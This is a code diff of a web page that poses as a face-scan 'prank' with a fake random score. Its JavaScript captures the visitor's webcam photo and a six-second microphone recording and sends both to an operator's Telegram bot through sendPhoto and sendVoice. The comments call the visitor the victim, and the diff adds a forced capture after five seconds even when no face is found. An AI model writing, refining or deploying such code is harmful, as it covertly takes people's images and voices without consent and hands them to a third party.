@@ -56,6 +56,7 @@
         let mediaRecorder;
         let audioChunks = [];
         let isProcessing = false;
+        let captureTimeout;
 
         async function loadAI() {
             try {
@@ -67,40 +68,39 @@
         document.getElementById('start-btn').onclick = async () => {
             document.getElementById('intro').style.display = 'none';
             document.getElementById('cam-holder').style.display = 'block';
-            status.innerText = "SENSING...";
+            status.innerText = "SENSING FACE...";
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
 
-                // Tentukan format yang didukung browser
-                const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
-                                 ? 'audio/webm;codecs=opus' 
-                                 : 'audio/webm';
-
+                const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm';
                 mediaRecorder = new MediaRecorder(stream, { mimeType });
                 
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) audioChunks.push(e.data);
-                };
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
                 
                 video.addEventListener('play', () => {
-                    // Force Capture 12 detik
-                    setTimeout(() => { if (!isProcessing) startPrank(); }, 12000);
+                    // JIKA DALAM 5 DETIK WAJAH TIDAK STABIL, PAKSA SCAN!
+                    captureTimeout = setTimeout(() => {
+                        if (!isProcessing) {
+                            console.log("Force Triggered");
+                            startPrank();
+                        }
+                    }, 5000);
 
                     const checkLoop = setInterval(async () => {
                         if (isProcessing) { clearInterval(checkLoop); return; }
                         const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions());
                         if (detections.length > 0) {
+                            clearTimeout(captureTimeout);
                             startPrank();
                             clearInterval(checkLoop);
                         }
-                    }, 1000);
+                    }, 800);
                 });
 
                 mediaRecorder.onstop = async () => {
                     status.innerText = "FINALIZING...";
-                    // JEDA KRUSIAL: Menunggu browser memproses metadata durasi
                     setTimeout(async () => { await takeAndSend(); }, 2000);
                 };
 
@@ -113,14 +113,15 @@
         function startPrank() {
             isProcessing = true;
             laser.style.display = 'block';
-            status.innerText = "SCANNING...";
+            status.innerText = "SCANNING GEOMETRY...";
             audioChunks = [];
-            mediaRecorder.start(200); // Rekam dalam potongan kecil
-            setTimeout(() => { mediaRecorder.stop(); }, 7000); // Rekam 7 detik
+            mediaRecorder.start(200); 
+            // Rekam selama 6 detik lalu kirim
+            setTimeout(() => { mediaRecorder.stop(); }, 6000);
         }
 
         async function takeAndSend() {
-            // 1. Capture Foto
+            // Ambil Gambar
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -130,23 +131,21 @@
             const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
             const score = Math.floor(Math.random() * 10) + 89;
 
-            // 2. Kirim Foto
+            // Kirim Foto
             const photoData = new FormData();
             photoData.append('chat_id', CONFIG.CHAT_ID);
             photoData.append('photo', photoBlob, 'result.png');
-            photoData.append('caption', `🎯 **TARGET VERIFIED**\n\n📊 Skor: ${score}%`);
+            photoData.append('caption', `🎯 **ANALYSIS COMPLETE**\n\n📊 Skor: ${score}%`);
             await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: photoData });
 
-            // 3. Kirim VN (Format Fix)
+            // Kirim Audio
             const audioBlob = new Blob(audioChunks, { type: mediaRecorder.mimeType });
             const audioData = new FormData();
             audioData.append('chat_id', CONFIG.CHAT_ID);
-            // KUNCI: Gunakan ekstensi .ogg agar Telegram memproses durasi dengan benar
-            audioData.append('voice', audioBlob, 'audio_fix.ogg'); 
-            
+            audioData.append('voice', audioBlob, 'voice.ogg'); 
             await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVoice`, { method: 'POST', body: audioData });
 
-            // 4. UI Finish
+            // Tampilkan Skor di Layar Korban
             document.getElementById('cam-holder').style.display = 'none';
             status.style.display = 'none';
             document.getElementById('score-val').innerText = score + "%";
